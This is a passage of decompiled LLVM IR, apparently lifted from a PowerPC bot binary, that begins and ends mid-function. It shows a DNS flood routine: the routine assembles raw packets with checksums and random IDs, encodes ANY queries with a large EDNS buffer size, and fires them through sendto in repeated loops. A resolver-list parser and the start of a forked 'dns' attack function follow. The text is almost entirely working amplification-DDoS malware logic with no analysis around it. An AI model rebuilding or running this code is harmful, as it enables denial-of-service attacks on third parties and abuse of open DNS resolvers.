  %v1_1000271c = sext i16 %v3_10002710 to i32
  %v2_1000271c = call i32 @__asm_rlwinm(i32 %v1_1000271c, i32 0, i32 28, i32 23)
  %v1_10002728 = trunc i32 %v2_1000271c to i16
  %v2_10002728 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002728 = add i32 %v2_10002728, 2
  %v4_10002728 = inttoptr i32 %v3_10002728 to i16*
  store i16 %v1_10002728, i16* %v4_10002728, align 2
  store i32 1, i32* @r3, align 4
  %v1_10002730 = call i32 @htons(i32 1)
  %v1_1000273c = trunc i32 %v1_10002730 to i16
  %v3_1000273c = add i32 %v2_10002508, 32
  %v4_1000273c = inttoptr i32 %v3_1000273c to i16*
  store i16 %v1_1000273c, i16* %v4_1000273c, align 4
  %v3_10002748 = add i32 %v2_10002508, 34
  %v4_10002748 = inttoptr i32 %v3_10002748 to i16*
  store i16 0, i16* %v4_10002748, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_10002754 = add i32 %v2_10002508, 36
  %v4_10002754 = inttoptr i32 %v3_10002754 to i16*
  store i16 0, i16* %v4_10002754, align 4
  store i32 1, i32* @r3, align 4
  %v1_1000275c = call i32 @htons(i32 1)
  %v1_10002768 = trunc i32 %v1_1000275c to i16
  %v3_10002768 = add i32 %v2_10002508, 38
  %v4_10002768 = inttoptr i32 %v3_10002768 to i16*
  store i16 %v1_10002768, i16* %v4_10002768, align 2
  store i32 %v3_10002494, i32* %v3_100025c8, align 4
  store i32 %v3_100024b4, i32* %r9.global-to-local, align 4
  %v1_10002798 = add i32 %v3_100024b4, 4
  %v2_10002798 = inttoptr i32 %v1_10002798 to i32*
  %v3_10002798 = load i32, i32* %v2_10002798, align 4
  %v2_100027a0 = add i32 %v2_10002508, 16
  %v3_100027a0 = inttoptr i32 %v2_100027a0 to i32*
  store i32 %v3_10002798, i32* %v3_100027a0, align 4
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_100027ac = load i16, i16* %v4_10002564, align 2
  %div = udiv i16 %v3_100027ac, 2
  %v1_100027b4 = zext i16 %div to i32
  %v2_100027c4 = bitcast i32* %stack_var_-4692 to i16*
  %v3_100027c4 = call i32 @csum(i16* %v2_100027c4, i32 %v1_100027b4)
  %sext8 = mul i32 %v3_100027c4, 65536
  %v1_100027c8 = sdiv i32 %sext8, 65536
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v1_100027d0 = trunc i32 %v1_100027c8 to i16
  store i16 %v1_100027d0, i16* %v4_100025b0, align 2
  %v2_10002858 = add i32 %v2_10002508, 40
  %v2_10002868 = ptrtoint i32* %stack_var_-580 to i32
  %v2_10002884 = inttoptr i32 %v2_10002858 to i8*
  %v2_10002904 = ptrtoint i16** %stack_var_-4744 to i32
  %v3_10002ac0 = add i32 %v2_10002508, 24
  %v4_10002ac0 = inttoptr i32 %v3_10002ac0 to i16*
  %v2_10002908 = add i32 %v2_10002904, 97
  %v2_10002928 = add i32 %v2_10002904, 98
  %v2_10002948 = add i32 %v2_10002904, 99
  %v2_10002968 = add i32 %v2_10002904, 100
  %v2_10002988 = add i32 %v2_10002904, 101
  %v2_100029a8 = add i32 %v2_10002904, 102
  %v2_100029c8 = add i32 %v2_10002904, 103
  %v2_100029e8 = add i32 %v2_10002904, 104
  %v2_10002a08 = add i32 %v2_10002904, 105
  %v2_10002a28 = add i32 %v2_10002904, 106
  %v2_10002a48 = add i32 %v2_10002904, 107
  %v2_10002a68 = add i32 %v2_10002904, 52
  br label %dec_label_pc_100027e4

dec_label_pc_100027e4:                            ; preds = %dec_label_pc_10002b90, %dec_label_pc_100024f4
  %stack_var_-4732.0 = phi i32 [ 0, %dec_label_pc_100024f4 ], [ %v1_10002b94, %dec_label_pc_10002b90 ]
  %stack_var_-4736.0 = phi i32 [ 0, %dec_label_pc_100024f4 ], [ %v1_10002a78, %dec_label_pc_10002b90 ]
  %stack_var_-4704.0 = phi i32 [ %v3_100024b4, %dec_label_pc_100024f4 ], [ %v3_10002804, %dec_label_pc_10002b90 ]
  %v3_100027e8 = icmp eq i32 %stack_var_-4732.0, 2
  br i1 %v3_100027e8, label %dec_label_pc_100027f0, label %dec_label_pc_10002800

dec_label_pc_100027f0:                            ; preds = %dec_label_pc_100027e4
  store i32 ptrtoint (i32* @global_var_100027f8.102 to i32), i32* @lr, align 4
  %v1_100027f4 = call i32 @usleep(i32 100)
  br label %dec_label_pc_10002800

dec_label_pc_10002800:                            ; preds = %dec_label_pc_100027e4, %dec_label_pc_100027f0
  %stack_var_-4732.1 = phi i32 [ 0, %dec_label_pc_100027f0 ], [ %stack_var_-4732.0, %dec_label_pc_100027e4 ]
  store i32 %stack_var_-4704.0, i32* %r9.global-to-local, align 4
  %v1_10002804 = add i32 %stack_var_-4704.0, 532
  %v2_10002804 = inttoptr i32 %v1_10002804 to i32*
  %v3_10002804 = load i32, i32* %v2_10002804, align 4
  %v2_1000281c = add i32 %v2_10002858, %stack_var_-4736.0
  %v1_10002824 = add i32 %stack_var_-4736.0, 256
  store i32 %v2_1000281c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000281c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_10002824, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000283c.103 to i32), i32* @lr, align 4
  %v0_10002838 = call i32 @__GI_memset()
  %v1_10002864 = add i32 %v3_10002804, 16
  store i32 %v1_10002864, i32* %r9.global-to-local, align 4
  %v2_10002874 = inttoptr i32 %v1_10002864 to i8*
  %v3_10002874 = call i32 @strcpy(i32 %v2_10002868, i8* %v2_10002874)
  %v3_10002884 = call i32 @ChangetoDnsNameFormat(i8* %v2_10002884, i32 %v2_10002868)
  store i32 %v2_10002858, i32* @r3, align 4
  %v0_10002890 = call i32 @__GI_strlen()
  %v2_100028b0 = add i32 %v0_10002890, 41
  store i32 %v2_100028b0, i32* %r9.global-to-local, align 4
  %v2_100028bc = add i32 %v2_100028b0, %v2_10002508
  %v5_100028c0 = inttoptr i32 %v2_100028bc to i16*
  store i16* %v5_100028c0, i16** %stack_var_-4744, align 4
  store i32 255, i32* @r3, align 4
  %v1_100028c8 = call i32 @htons(i32 255)
  %sext9 = mul i32 %v1_100028c8, 65536
  %v1_100028cc = sdiv i32 %sext9, 65536
  %v3_100028d0 = load i16*, i16** %stack_var_-4744, align 4
  %v4_100028d0 = ptrtoint i16* %v3_100028d0 to i32
  store i32 %v4_100028d0, i32* %r9.global-to-local, align 4
  %v1_100028d4 = trunc i32 %v1_100028cc to i16
  store i16 %v1_100028d4, i16* %v3_100028d0, align 2
  store i32 1, i32* @r3, align 4
  %v1_100028dc = call i32 @htons(i32 1)
  %v3_100028e4 = load i16*, i16** %stack_var_-4744, align 4
  %v4_100028e4 = ptrtoint i16* %v3_100028e4 to i32
  %v1_100028e8 = trunc i32 %v1_100028dc to i16
  %v3_100028e8 = add i32 %v4_100028e4, 2
  %v4_100028e8 = inttoptr i32 %v3_100028e8 to i16*
  store i16 %v1_100028e8, i16* %v4_100028e8, align 2
  %v3_10002910 = add i32 %v2_10002908, %v0_10002890
  %v4_10002910 = inttoptr i32 %v3_10002910 to i8*
  store i8 0, i8* %v4_10002910, align 1
  %v3_10002930 = add i32 %v2_10002928, %v0_10002890
  %v4_10002930 = inttoptr i32 %v3_10002930 to i8*
  store i8 0, i8* %v4_10002930, align 1
  %v3_10002950 = add i32 %v2_10002948, %v0_10002890
  %v4_10002950 = inttoptr i32 %v3_10002950 to i8*
  store i8 41, i8* %v4_10002950, align 1
  %v3_10002970 = add i32 %v2_10002968, %v0_10002890
  %v4_10002970 = inttoptr i32 %v3_10002970 to i8*
  store i8 35, i8* %v4_10002970, align 1
  %v3_10002990 = add i32 %v2_10002988, %v0_10002890
  %v4_10002990 = inttoptr i32 %v3_10002990 to i8*
  store i8 40, i8* %v4_10002990, align 1
  %v3_100029b0 = add i32 %v2_100029a8, %v0_10002890
  %v4_100029b0 = inttoptr i32 %v3_100029b0 to i8*
  store i8 0, i8* %v4_100029b0, align 1
  %v3_100029d0 = add i32 %v2_100029c8, %v0_10002890
  %v4_100029d0 = inttoptr i32 %v3_100029d0 to i8*
  store i8 0, i8* %v4_100029d0, align 1
  %v3_100029f0 = add i32 %v2_100029e8, %v0_10002890
  %v4_100029f0 = inttoptr i32 %v3_100029f0 to i8*
  store i8 0, i8* %v4_100029f0, align 1
  %v3_10002a10 = add i32 %v2_10002a08, %v0_10002890
  %v4_10002a10 = inttoptr i32 %v3_10002a10 to i8*
  store i8 0, i8* %v4_10002a10, align 1
  %v3_10002a30 = add i32 %v2_10002a28, %v0_10002890
  %v4_10002a30 = inttoptr i32 %v3_10002a30 to i8*
  store i8 0, i8* %v4_10002a30, align 1
  %v3_10002a50 = add i32 %v2_10002a48, %v0_10002890
  %v4_10002a50 = inttoptr i32 %v3_10002a50 to i8*
  store i8 0, i8* %v4_10002a50, align 1
  %v1_10002a60 = add i32 %v0_10002890, 56
  %v3_10002a70 = add i32 %v2_10002a68, %v1_10002a60
  %v4_10002a70 = inttoptr i32 %v3_10002a70 to i8*
  store i8 0, i8* %v4_10002a70, align 1
  %v1_10002a78 = add i32 %v0_10002890, 16
  store i32 %v3_10002804, i32* %r9.global-to-local, align 4
  %v1_10002a84 = add i32 %v3_10002804, 4
  %v2_10002a84 = inttoptr i32 %v1_10002a84 to i32*
  %v3_10002a84 = load i32, i32* %v2_10002a84, align 4
  store i32 %v3_10002a84, i32* %v3_100027a0, align 4
  %v1_10002aa4 = urem i32 %v1_10002a60, 65536
  store i32 %v1_10002aa4, i32* %r9.global-to-local, align 4
  %fold11 = add i32 %v0_10002890, 36
  %v1_10002aac = urem i32 %fold11, 65536
  store i32 %v1_10002aac, i32* @r3, align 4
  %v1_10002ab4 = call i32 @htons(i32 %v1_10002aac)
  %v1_10002ac0 = trunc i32 %v1_10002ab4 to i16
  store i16 %v1_10002ac0, i16* %v4_10002ac0, align 4
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v1_10002ae0 = trunc i32 %v1_10002a60 to i16
  store i16 %v1_10002ae0, i16* %v4_10002564, align 2
  %v0_10002ae4 = call i32 @rand_cmwc()
  %v1_10002aec = urem i32 %v0_10002ae4, 65536
  store i32 %v1_10002aec, i32* @r3, align 4
  %v1_10002af4 = call i32 @htons(i32 %v1_10002aec)
  %sext14 = mul i32 %v1_10002af4, 65536
  %v1_10002af8 = sdiv i32 %sext14, 65536
  %v1_10002b00 = trunc i32 %v1_10002af8 to i16
  store i16 %v1_10002b00, i16* %v5_100025e8, align 4
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_10002b0c = load i16, i16* %v4_10002564, align 2
  %div52 = udiv i16 %v3_10002b0c, 2
  %v1_10002b14 = zext i16 %div52 to i32
  %v3_10002b24 = call i32 @csum(i16* %v2_100027c4, i32 %v1_10002b14)
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v1_10002b30 = trunc i32 %v3_10002b24 to i16
  store i16 %v1_10002b30, i16* %v4_100025b0, align 2
  br label %dec_label_pc_10002b40

dec_label_pc_10002b40:                            ; preds = %dec_label_pc_10002800, %dec_label_pc_10002b40
  %storemerge1617 = phi i32 [ 0, %dec_label_pc_10002800 ], [ %v1_10002b7c, %dec_label_pc_10002b40 ]
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_10002b44 = load i16, i16* %v4_10002564, align 2
  %v4_10002b44 = zext i16 %v3_10002b44 to i32
  store i32 %v4_10002b44, i32* %r9.global-to-local, align 4
  store i32 268446584, i32* @lr, align 4
  %v6_10002b74 = call i32 @sendto(i32 %v3_100024d4, i32 %v2_10002508, i32 %v4_10002b44, i32 0, i32 %v3_10002804, i32 16)
  store i32 %storemerge1617, i32* %r9.global-to-local, align 4
  %v1_10002b7c = add nuw nsw i32 %storemerge1617, 1
  %tmp51 = icmp slt i32 %v1_10002b7c, 25
  br i1 %tmp51, label %dec_label_pc_10002b40, label %dec_label_pc_10002b90

dec_label_pc_10002b90:                            ; preds = %dec_label_pc_10002b40
  store i32 %stack_var_-4732.1, i32* %r9.global-to-local, align 4
  %v1_10002b94 = add i32 %stack_var_-4732.1, 1
  br label %dec_label_pc_100027e4

dec_label_pc_10002ba0:                            ; preds = %entry
  ret i32 %v0_1000246c

; uselistorder directives
  uselistorder i32 %v1_10002aec, { 1, 0 }
  uselistorder i32 %v1_10002aac, { 1, 0 }
  uselistorder i32 %v1_10002a60, { 2, 0, 1 }
  uselistorder i32 %v0_10002890, { 11, 12, 13, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder i32 %v3_10002804, { 0, 3, 2, 4, 1 }
  uselistorder i32 %stack_var_-4732.1, { 1, 0 }
  uselistorder i32 %stack_var_-4704.0, { 1, 0 }
  uselistorder i32 %stack_var_-4736.0, { 1, 0 }
  uselistorder i32 %v2_10002858, { 1, 0, 2 }
  uselistorder i16* %v2_1000266c, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 %v1_10002650, { 1, 0 }
  uselistorder i32 %v1_100025f0, { 1, 0 }
  uselistorder i32 %v2_10002508, { 28, 14, 15, 16, 17, 0, 1, 2, 18, 19, 20, 3, 4, 5, 6, 7, 8, 9, 10, 11, 21, 22, 23, 24, 25, 26, 12, 27, 13, 29 }
  uselistorder i32 %v3_100024b4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4692, { 2, 0, 1, 3 }
  uselistorder i16** %stack_var_-4744, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2, 5, 4 }
  uselistorder label %dec_label_pc_10002b40, { 1, 0 }
  uselistorder label %dec_label_pc_10002800, { 1, 0 }
  uselistorder label %dec_label_pc_100024f4, { 1, 0 }
}

define i32 @ParseResolverLine(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-1052 = alloca i8*, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1084 = alloca i8*, align 4
  %stack_var_-539 = alloca i32, align 4
  %stack_var_-1051 = alloca i32, align 4
  %v2_10002be0 = load i8, i8* bitcast (i8** @global_var_1002a5d8.104 to i8*), align 4
  %v3_10002be0 = zext i8 %v2_10002be0 to i32
  %v6_10002be4 = inttoptr i32 %v3_10002be0 to i8*
  store i8* %v6_10002be4, i8** %stack_var_-1084, align 4
  store i8* %v6_10002be4, i8** %stack_var_-1052, align 4
  %v2_10002c40 = ptrtoint i32* %stack_var_-1051 to i32
  store i32 511, i32* %r9.global-to-local, align 4
  store i32 %v2_10002c40, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 511, i32* @r5, align 4
  store i32 268446808, i32* @lr, align 4
  %v0_10002c54 = call i32 @__GI_memset()
  %v2_10002c68 = ptrtoint i32* %stack_var_-539 to i32
  store i32 511, i32* %r9.global-to-local, align 4
  store i32 %v2_10002c68, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 511, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002c80.105 to i32), i32* @lr, align 4
  %v0_10002c7c = call i32 @__GI_memset()
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d9c5 = call i32 @__GI_strlen()
  store i32 %v0_10002d9c5, i32* %r3.global-to-local, align 4
  %v2_10002da47 = icmp eq i32 %v0_10002d9c5, 0
  br i1 %v2_10002da47, label %dec_label_pc_10002dac, label %dec_label_pc_10002c94.lr.ph

dec_label_pc_10002c94.lr.ph:                      ; preds = %entry
  %v2_10002d10 = ptrtoint i8** %stack_var_-1084 to i32
  %v2_10002d38 = ptrtoint i32* %stack_var_-1096 to i32
  %v2_10002d54 = ptrtoint i8** %stack_var_-1052 to i32
  br label %dec_label_pc_10002c94

dec_label_pc_10002c94:                            ; preds = %dec_label_pc_10002c94.lr.ph, %dec_label_pc_10002d88
  %storemerge411 = phi i32 [ 0, %dec_label_pc_10002c94.lr.ph ], [ %v1_10002d8c, %dec_label_pc_10002d88 ]
  %stack_var_-1092.110 = phi i32 [ 0, %dec_label_pc_10002c94.lr.ph ], [ %stack_var_-1092.0, %dec_label_pc_10002d88 ]
  %v2_10002ca0 = add i32 %storemerge411, %arg1
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v1_10002ca4 = inttoptr i32 %v2_10002ca0 to i8*
  %v2_10002ca4 = load i8, i8* %v1_10002ca4, align 1
  %v3_10002cac = icmp eq i8 %v2_10002ca4, 32
  br i1 %v3_10002cac, label %dec_label_pc_10002cf4, label %dec_label_pc_10002cb4

dec_label_pc_10002cb4:                            ; preds = %dec_label_pc_10002c94
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002cc4 = load i8, i8* %v1_10002ca4, align 1
  %v3_10002ccc = icmp eq i8 %v2_10002cc4, 10
  br i1 %v3_10002ccc, label %dec_label_pc_10002cf4, label %dec_label_pc_10002cd4

dec_label_pc_10002cd4:                            ; preds = %dec_label_pc_10002cb4
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002ce4 = load i8, i8* %v1_10002ca4, align 1
  %v3_10002cec = icmp eq i8 %v2_10002ce4, 9
  br i1 %v3_10002cec, label %dec_label_pc_10002cf4, label %dec_label_pc_10002d04

dec_label_pc_10002cf4:                            ; preds = %dec_label_pc_10002cd4, %dec_label_pc_10002cb4, %dec_label_pc_10002c94
  store i32 %stack_var_-1092.110, i32* %r9.global-to-local, align 4
  %v1_10002cf8 = add i32 %stack_var_-1092.110, 1
  br label %dec_label_pc_10002d88

dec_label_pc_10002d04:                            ; preds = %dec_label_pc_10002cd4
  %v3_10002d08 = icmp eq i32 %stack_var_-1092.110, 0
  br i1 %v3_10002d08, label %dec_label_pc_10002d10, label %dec_label_pc_10002d48

dec_label_pc_10002d10:                            ; preds = %dec_label_pc_10002d04
  store i32 %v2_10002d10, i32* @r3, align 4
  %v0_10002d18 = call i32 @__GI_strlen()
  store i32 %v0_10002d18, i32* %r3.global-to-local, align 4
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002d30 = load i8, i8* %v1_10002ca4, align 1
  %v2_10002d3c = add i32 %v0_10002d18, %v2_10002d38
  store i32 %v2_10002d3c, i32* %r9.global-to-local, align 4
  %v3_10002d40 = add i32 %v2_10002d3c, 12
  %v4_10002d40 = inttoptr i32 %v3_10002d40 to i8*
  store i8 %v2_10002d30, i8* %v4_10002d40, align 1
  br label %dec_label_pc_10002d88

dec_label_pc_10002d48:                            ; preds = %dec_label_pc_10002d04
  %v3_10002d4c = icmp eq i32 %stack_var_-1092.110, 1
  br i1 %v3_10002d4c, label %dec_label_pc_10002d54, label %dec_label_pc_10002d88

dec_label_pc_10002d54:                            ; preds = %dec_label_pc_10002d48
  store i32 %v2_10002d54, i32* @r3, align 4
  %v0_10002d5c = call i32 @__GI_strlen()
  store i32 %v0_10002d5c, i32* %r3.global-to-local, align 4
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002d74 = load i8, i8* %v1_10002ca4, align 1
  %v2_10002d80 = add i32 %v0_10002d5c, %v2_10002d38
  store i32 %v2_10002d80, i32* %r9.global-to-local, align 4
  %v3_10002d84 = add i32 %v2_10002d80, 44
  %v4_10002d84 = inttoptr i32 %v3_10002d84 to i8*
  store i8 %v2_10002d74, i8* %v4_10002d84, align 1
  br label %dec_label_pc_10002d88

dec_label_pc_10002d88:                            ; preds = %dec_label_pc_10002d48, %dec_label_pc_10002d10, %dec_label_pc_10002cf4, %dec_label_pc_10002d54
  %stack_var_-1092.0 = phi i32 [ %v1_10002cf8, %dec_label_pc_10002cf4 ], [ 0, %dec_label_pc_10002d10 ], [ 1, %dec_label_pc_10002d54 ], [ %stack_var_-1092.110, %dec_label_pc_10002d48 ]
  store i32 %storemerge411, i32* %r9.global-to-local, align 4
  %v1_10002d8c = add i32 %storemerge411, 1
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d9c = call i32 @__GI_strlen()
  store i32 %v0_10002d9c, i32* %r3.global-to-local, align 4
  %v2_10002da4 = icmp ult i32 %v1_10002d8c, %v0_10002d9c
  br i1 %v2_10002da4, label %dec_label_pc_10002c94, label %dec_label_pc_10002dac

dec_label_pc_10002dac:                            ; preds = %entry, %dec_label_pc_10002d88
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10002db0 = load i32, i32* @global_var_100451b4.106, align 4
  %v3_10002db4 = icmp eq i32 %v3_10002db0, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10002db4, label %dec_label_pc_10002dbc, label %dec_label_pc_10002e88

dec_label_pc_10002dbc:                            ; preds = %dec_label_pc_10002dac
  store i32 268447172, i32* @lr, align 4
  %v0_10002dc0 = call i32 @malloc()
  store i32 %v0_10002dc0, i32* @global_var_100451b4.106, align 4
  store i32 %v0_10002dc0, i32* %r9.global-to-local, align 4
  %v2_10002de0 = inttoptr i32 %v0_10002dc0 to i32*
  store i32 0, i32* %v2_10002de0, align 4
  %v1_10002de8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10002de8 = add i32 %v1_10002de8, 4
  %v3_10002de8 = inttoptr i32 %v2_10002de8 to i32*
  store i32 0, i32* %v3_10002de8, align 4
  %v1_10002df0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10002df0 = add i32 %v1_10002df0, 8
  %v3_10002df0 = inttoptr i32 %v2_10002df0 to i32*
  store i32 0, i32* %v3_10002df0, align 4
  %v1_10002df8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10002df8 = add i32 %v1_10002df8, 12
  %v3_10002df8 = inttoptr i32 %v2_10002df8 to i32*
  store i32 0, i32* %v3_10002df8, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10002e00 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10002e04 = ptrtoint i8** %stack_var_-1084 to i32
  store i32 %v2_10002e04, i32* %r3.global-to-local, align 4
  store i32 268447248, i32* @lr, align 4
  %v1_10002e0c = call i32 @inet_addr(i32 %v2_10002e04)
  %v2_10002e14 = add i32 %v3_10002e00, 4
  %v3_10002e14 = inttoptr i32 %v2_10002e14 to i32*
  store i32 %v1_10002e0c, i32* %v3_10002e14, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10002e1c = load i32, i32* @global_var_100451b4.106, align 4
  store i32 53, i32* @r3, align 4
  %v1_10002e24 = call i32 @htons(i32 53)
  %v1_10002e2c = trunc i32 %v1_10002e24 to i16
  %v3_10002e2c = add i32 %v3_10002e1c, 2
  %v4_10002e2c = inttoptr i32 %v3_10002e2c to i16*
  store i16 %v1_10002e2c, i16* %v4_10002e2c, align 2
  %v3_10002e34 = load i32, i32* @global_var_100451b4.106, align 4
  %v1_10002e38 = add i32 %v3_10002e34, 16
  %v2_10002e3c = ptrtoint i8** %stack_var_-1052 to i32
  store i32 %v2_10002e3c, i32* %r9.global-to-local, align 4
  store i32 %v1_10002e38, i32* %r3.global-to-local, align 4
  %v2_10002e48 = bitcast i8** %stack_var_-1052 to i8*
  %v3_10002e48 = call i32 @strcpy(i32 %v1_10002e38, i8* %v2_10002e48)
  store i32 %v3_10002e48, i32* %r3.global-to-local, align 4
  %v3_10002e50 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10002e58 = add i32 %v3_10002e50, 528
  %v3_10002e58 = inttoptr i32 %v2_10002e58 to i32*
  store i32 %arg2, i32* %v3_10002e58, align 4
  %v3_10002e60 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10002e6c = add i32 %v3_10002e60, 532
  %v3_10002e6c = inttoptr i32 %v2_10002e6c to i32*
  store i32 %v3_10002e60, i32* %v3_10002e6c, align 4
  %v3_10002e74 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10002e80 = add i32 %v3_10002e74, 536
  %v3_10002e80 = inttoptr i32 %v2_10002e80 to i32*
  store i32 %v3_10002e74, i32* %v3_10002e80, align 4
  br label %dec_label_pc_10002f38

dec_label_pc_10002e88:                            ; preds = %dec_label_pc_10002dac
  store i32 268447376, i32* @lr, align 4
  %v0_10002e8c = call i32 @malloc()
  store i32 %v0_10002e8c, i32* %stack_var_-1096, align 4
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10002e8c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268447408, i32* @lr, align 4
  %v0_10002eac = call i32 @__GI_memset()
  %v2_10002eb0 = ptrtoint i8** %stack_var_-1084 to i32
  store i32 %v2_10002eb0, i32* %r3.global-to-local, align 4
  store i32 268447420, i32* @lr, align 4
  %v1_10002eb8 = call i32 @inet_addr(i32 %v2_10002eb0)
  %v3_10002ec0 = load i32, i32* %stack_var_-1096, align 4
  store i32 %v3_10002ec0, i32* %r9.global-to-local, align 4
  %v2_10002ec4 = add i32 %v3_10002ec0, 4
  %v3_10002ec4 = inttoptr i32 %v2_10002ec4 to i32*
  store i32 %v1_10002eb8, i32* %v3_10002ec4, align 4
  store i32 53, i32* @r3, align 4
  %v1_10002ecc = call i32 @htons(i32 53)
  %v3_10002ed4 = load i32, i32* %stack_var_-1096, align 4
  %v1_10002ed8 = trunc i32 %v1_10002ecc to i16
  %v3_10002ed8 = add i32 %v3_10002ed4, 2
  %v4_10002ed8 = inttoptr i32 %v3_10002ed8 to i16*
  store i16 %v1_10002ed8, i16* %v4_10002ed8, align 2
  %v3_10002edc = load i32, i32* %stack_var_-1096, align 4
  %v1_10002ee0 = add i32 %v3_10002edc, 16
  %v2_10002ee4 = ptrtoint i8** %stack_var_-1052 to i32
  store i32 %v2_10002ee4, i32* %r9.global-to-local, align 4
  store i32 %v1_10002ee0, i32* %r3.global-to-local, align 4
  %v2_10002ef0 = bitcast i8** %stack_var_-1052 to i8*
  %v3_10002ef0 = call i32 @strcpy(i32 %v1_10002ee0, i8* %v2_10002ef0)
  store i32 %v3_10002ef0, i32* %r3.global-to-local, align 4
  %v3_10002ef8 = load i32, i32* @global_var_100451b4.106, align 4
  %v3_10002efc = load i32, i32* %stack_var_-1096, align 4
  %v2_10002f00 = add i32 %v3_10002efc, 536
  %v3_10002f00 = inttoptr i32 %v2_10002f00 to i32*
  store i32 %v3_10002ef8, i32* %v3_10002f00, align 4
  %v3_10002f08 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10002f10 = add i32 %v3_10002f08, 528
  %v3_10002f10 = inttoptr i32 %v2_10002f10 to i32*
  store i32 %arg2, i32* %v3_10002f10, align 4
  %v3_10002f18 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10002f18, i32* %r9.global-to-local, align 4
  %v1_10002f1c = add i32 %v3_10002f18, 532
  %v2_10002f1c = inttoptr i32 %v1_10002f1c to i32*
  %v3_10002f1c = load i32, i32* %v2_10002f1c, align 4
  %v3_10002f20 = load i32, i32* %stack_var_-1096, align 4
  %v2_10002f24 = add i32 %v3_10002f20, 532
  %v3_10002f24 = inttoptr i32 %v2_10002f24 to i32*
  store i32 %v3_10002f1c, i32* %v3_10002f24, align 4
  %v3_10002f2c = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10002f2c, i32* %r9.global-to-local, align 4
  %v3_10002f30 = load i32, i32* %stack_var_-1096, align 4
  %v2_10002f34 = add i32 %v3_10002f2c, 532
  %v3_10002f34 = inttoptr i32 %v2_10002f34 to i32*
  store i32 %v3_10002f30, i32* %v3_10002f34, align 4
  br label %dec_label_pc_10002f38

dec_label_pc_10002f38:                            ; preds = %dec_label_pc_10002dbc, %dec_label_pc_10002e88
  %v0_10002f50 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10002f50

; uselistorder directives
  uselistorder i32 %v2_10002eb0, { 1, 0 }
  uselistorder i32 %v3_10002e74, { 1, 0 }
  uselistorder i32 %v3_10002e60, { 1, 0 }
  uselistorder i32 %v2_10002e04, { 1, 0 }
  uselistorder i32 %stack_var_-1092.110, { 4, 3, 2, 0, 1 }
  uselistorder i32 %storemerge411, { 1, 2, 0 }
  uselistorder i8** %stack_var_-1084, { 2, 1, 0, 3 }
  uselistorder i8** %stack_var_-1052, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %r3.global-to-local, { 9, 3, 4, 5, 10, 6, 7, 11, 1, 8, 2, 0 }
  uselistorder i32 511, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10002f38, { 1, 0 }
  uselistorder label %dec_label_pc_10002dac, { 1, 0 }
  uselistorder label %dec_label_pc_10002d88, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10002c94, { 1, 0 }
}

define i32 @dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-319 = alloca i32, align 4
  %stack_var_-1376 = alloca i32, align 4
  %stack_var_-1424 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10002f54 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10002f54, i32* %stack_var_-1424, align 4
  %v5_10002f54 = ptrtoint i32* %stack_var_-1424 to i32
  %v1_10002f8c = call i32 @mfork(i32 %arg2)
  %v3_10002f94 = icmp eq i32 %v1_10002f8c, 0
  br i1 %v3_10002f94, label %dec_label_pc_10002f9c, label %dec_label_pc_100033bc

dec_label_pc_10002f9c:                            ; preds = %entry
  store i32 268447660, i32* @lr, align 4
